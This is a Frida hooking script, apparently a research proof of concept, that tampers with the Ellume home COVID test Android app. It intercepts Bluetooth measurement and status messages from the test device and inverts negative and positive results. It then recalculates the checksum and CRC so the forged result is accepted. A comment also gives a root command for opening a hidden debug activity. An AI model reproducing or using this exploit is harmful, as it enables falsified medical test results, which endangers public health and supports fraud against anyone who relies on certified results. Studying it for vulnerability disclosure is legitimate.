console.log("[#] script loaded")
Java.perform(function() {
    // to test BLE stuff, launch bluetooth debug activity as root
    // am start -n com.ellumehealth.homecovid.android/com.gsk.itreat.activities.BluetoothDebugActivity
    var yayclassyay = Java.use('EV');

    yayclassyay.equals.overload('java.lang.Object').implementation = function(a) {

        var yayintegertoolsyay = Java.use("au.com.ellume.estick_sdk.util.IntegerExtensions");
        var yaybcdextensionsyay = Java.use("au.com.ellume.estick_sdk.util.BcdExtensions");
        var yaycClassyay = Java.use("c");
        var yayarraysyay = Java.use("java.util.Arrays");
        var yayresulttextyay = ["NO_RESULT", "NEGATIVE", "POSITIVE_T2", "POSITIVE_T1", "POSITIVE_T1_T2", "T1_CONJUGATE_WAVE_TOO_EARLY", "T2_CONJUGATE_WAVE_TOO_EARLY", "DARK_FREQUENCY_TOO_HIGH", "ZERO_C1_C2", "FREQUENCY_ZERO_TEST_LINE_1", "FREQUENCY_ZERO_TEST_LINE_2", "NO_CONJUGATE_WAVE_DETECTED", "DRY_FREQUENCY_OUT_OF_RANGE_TEST_LINE_1", "PEAK_FREQUENCY_TOO_LOW_TEST_LINE_1", "FINAL_FREQUENCIES_TOO_HIGH", "DRY_FREQUENCY_OUT_OF_RANGE_TEST_LINE_2", "PEAK_FREQUENCY_TOO_LOW_TEST_LINE_2", "CONTROL_2", "T1_T2_PEAK_DELTA_TOO_LONG", "RESULT_TIMEOUT", "T1_NEGATIVE_WAVE", "T2_NEGATIVE_WAVE", "SIGNAL_NOISE_HIGH", "C1_DRY_OUT_OF_RANGE", "C1_PEAK_LOW", "C2_DRY_OUT_OF_RANGE", "C2_PEAK_LOW", "NEGATIVE_WAVE_C1", "NEGATIVE_WAVE_C2", "CONTROL_WAVE_EARLY"] // taken from android app class au.com.ellume.estick_sdk.messaging.comms.AlgorithmResult 
        var yayalgorithmstatetextyay = ["NOT_STARTED", "AWAITING_CONJUGATE_WAVE", "AWAITING_PEAK_TEST_LINE_1", "AWAITING_PEAK_TEST_LINE_2", "MEASURING_AT_ONE_SECOND_INTERVAL", "MEASURING_AT_FIVE_SECOND_INTERVAL_NORMAL", "MEASURING_AT_FIVE_SECOND_INTERVAL_EXTENDED", "RESULT_AVAILABLE", "PREVIOUS_RESULT"] // taken from android app class au.com.ellume.estick_sdk.messaging.comms.AlgorithmState
        var yayhardwarestatusstringyay = ["OK", "UNLOADED_VOLTAGE_LOW_3V3", "UNLOADED_VOLTAGE_LOW_5V0", "LOADED_VOLTAGE_LOW_5V0", "LED_CURRENT_LOW_TEST_LINE_1", "LED_CURRENT_HIGH_TEST_LINE_1", "LED_CURRENT_LOW_TEST_LINE_2", "LED_CURRENT_HIGH_TEST_LINE2", "DARK_FREQUENCY_HIGH"] // taken from android app class Lk
        var yaystatustextyay = ["PERFORMING_SELF_TEST", "AWAITING_START", "USED", "SELF_TEST_FAILED", "PROCESSING", "RESULT", "STOPPED", "UNKNOWN"] // taken from android app class au.com.ellume.estick_sdk.messaging.comms.Status

        if (this.a.value[2] == 12) { // MEASUREMENT_CONTROL_DATA
            var yaycalculateyay = 0;
            var yayuniqueidintyay = yaybcdextensionsyay.getUInt32(yayarraysyay.copyOfRange(this.a.value, 4, 8));
            var yaysequencenumbershortyay = yayintegertoolsyay.toShort(yayarraysyay.copyOfRange(this.a.value, 8, 10));
            var yaytimestamptshortyay = yayintegertoolsyay.toShort(yayarraysyay.copyOfRange(this.a.value, 10, 12));
            var yayline1intyay = yayintegertoolsyay.toInt24(yayarraysyay.copyOfRange(this.a.value, 12, 15));
            var yayalgorithmstateyay = this.a.value[15];
            var yayline2intyay = yayintegertoolsyay.toInt24(yayarraysyay.copyOfRange(this.a.value, 16, 19));
            var yayhardwarestatusyay = this.a.value[19];
            var yaydarkfrequencyshortyay = yayintegertoolsyay.toShort(yayarraysyay.copyOfRange(this.a.value, 20, 22));
            var yayresultyay = this.a.value[22];
            var yayc1valueyay = yayintegertoolsyay.toShort(yayarraysyay.copyOfRange(this.a.value, 23, 25));
            var yayc2valueyay = yayintegertoolsyay.toShort(yayarraysyay.copyOfRange(this.a.value, 25, 27));
            var yaygivenchecksumyay = this.a.value[27];

            console.log(
                "[#] MEASUREMENT_CONTROL_DATA:" +
                "\n\t[#] byte array: " + this.a.value +
                "\n\t[#] test result: " + yayresultyay + " " + yayresulttextyay[yayresultyay] +
                "\n\t[#] algorithm state: " + yayalgorithmstateyay + " " + yayalgorithmstatetextyay[yayalgorithmstateyay] +
                "\n\t[#] timestamp: " + yaytimestamptshortyay +
                "\n\t[#] unique id: " + yayuniqueidintyay,
                "\n\t[#] line 1: " + yayline1intyay +
                "\n\t[#] line 2: " + yayline2intyay + 
                "\n\t[#] hardware status: " + yayhardwarestatusstringyay[yayhardwarestatusyay] + 
                "\n\t[#] sequence number: " + yaysequencenumbershortyay + 
                "\n\t[#] darkfrequency: " + yaydarkfrequencyshortyay +
                "\n\t[#] given checksum: " + yaygivenchecksumyay +
                "\n\t[#] crc value: " + this.a.value[28] + " " + this.a.value[29]
            );

            // debug
            var debug = false;
            if (debug == true) {
                this.a.value[22] = 2;
                console.log("\t\t[-] DEBUG - set result to POSITIVE");
                this.a.value[15] = 7;
                console.log("\t\t[-] DEBUG - set algorithm to RESULT_AVAILABLE");
            }

            //if test is negative then change to positive
            if (this.a.value[22] == 1){
                console.log("\t[-] Test was NEGATIVE, changing to POSITIVE");
                this.a.value[22] = 2;
                yaycalculateyay = 1;
            //if test is positive then change to negative
            } else if (this.a.value[22] == 2){
                console.log("\t[-] Test was POSITIVE, changing to NEGATIVE");
                this.a.value[22] = 1;
                yaycalculateyay = 1;
            }

            if (yaycalculateyay == 1) {
                // calculate checksum of smol area of byte array
                // 1) calculate new checksum value to int
                var yaysmolyay = yaycClassyay.b(yayarraysyay.copyOfRange(this.a.value, 4, 27));
                // 2) convert int to byte[] value
                var yaynewchecksumyay = yayintegertoolsyay.toBytes(yaysmolyay);
                // 3) assign new smol checksum, its byte[0]
                this.a.value[27] = yaynewchecksumyay[0];

                // modify crc value
                // 1) calculate new CRC short/int value
                var yaytointyay = yaycClassyay.b(yayarraysyay.copyOfRange(this.a.value, 0, this.a.value.length - 2));
                // 2) convert int to byte array
                var yaytobytearray = yayintegertoolsyay.toBytes(yaytointyay);
                // 3) replace last 2 bytes with new CRC value
                this.a.value[28] = yaytobytearray[0];
                this.a.value[29] = yaytobytearray[1];
                console.log(
                    "\t\t[#] calculated new checksum and CRC value" +
                    "\n\t\t[#] NEW byte array: " + this.a.value
                );
            }

        } else if (this.a.value[2] == 1) { // ACKNOWLEDGE
            console.log(
                "[#] ACKNOWLEDGE: " +
                "\n\t[#] byte array: " + this.a.value 
                );
        } else if (this.a.value[2] == 4) { // STATUS
            var yaycalculateyay = 0;
            var yayuniqueidintyay = yaybcdextensionsyay.getUInt32(yayarraysyay.copyOfRange(this.a.value, 4, 8));
            var yaystatusyay = this.a.value[8];
            var yayalgorithmstateyay = this.a.value[9];
            var yayresultyay = this.a.value[10];
            var yaymeasurecountyay = yayintegertoolsyay.toShort(yayarraysyay.copyOfRange(this.a.value, 11, 13));
            var yaytimetoresultyay = yayintegertoolsyay.toShort(yayarraysyay.copyOfRange(this.a.value, 13, 15));
            var yaytimetofailureyay = yayintegertoolsyay.toShort(yayarraysyay.copyOfRange(this.a.value, 15, 17));

            console.log(
                "[#] STATUS: " +
                "\n\t[#] byte array: " + this.a.value +
                "\n\t[#] result: " + yayresultyay + " " + yayresulttextyay[yayresultyay] +
                "\n\t[#] status: " + yaystatustextyay[yaystatusyay] +
                "\n\t[#] algorithm state: " + yayalgorithmstateyay + " " + yayalgorithmstatetextyay[yayalgorithmstateyay] +
                "\n\t[#] unique id: " + yayuniqueidintyay +
                "\n\t[#] measure count: " + yaymeasurecountyay +
                "\n\t[#] time to result: " + yaytimetoresultyay +
                "\n\t[#] time to failure: " + yaytimetofailureyay +
                "\n\t[#] crc value: " + this.a.value[17] + " " + this.a.value[18]
                );

            // debug
            var debug = false;
            if (debug == true){
                this.a.value[10] = 2;
                console.log("\t\t[-] DEBUG - set result to POSITIVE_T2");
                this.a.value[8] = 5;
                console.log("\t\t[-] DEBUG - set status to RESULT");
                this.a.value[9] = 7;
                console.log("\t\t[-] DEBUG - set algorithm status to RESULT_AVAILABLE")
            }
            
            //if test is negative then change to positive
            if (this.a.value[10] == 1){
                console.log("\t[-] Test was NEGATIVE, changing to POSITIVE");
                this.a.value[10] = 2;
                yaycalculateyay = 1;
            //if test is positive then change to negative
            } else if (this.a.value[10] == 2){
                console.log("\t[-] Test was POSITIVE, changing to NEGATIVE");
                this.a.value[10] = 1;
                yaycalculateyay = 1;
            }

            if (yaycalculateyay == 1) {
                // 1) calculate new CRC short/int value
                var yaytointyay = yaycClassyay.b(yayarraysyay.copyOfRange(this.a.value, 0, this.a.value.length - 2));
                // 2) convert int to byte array
                var yaytobytearray = yayintegertoolsyay.toBytes(yaytointyay);
                this.a.value[17] = yaytobytearray[0];
                this.a.value[18] = yaytobytearray[1];
                console.log(
                    "\t\t[#] calculated new checksum and CRC value" +
                    "\n\t\t[#] NEW byte array: " + this.a.value
                );
            }
        } else {
            console.log("[#] yay byte array yay: " + this.a.value)
        }

        var ret_value = this.equals(a);

        return ret_value;
    }
    
});
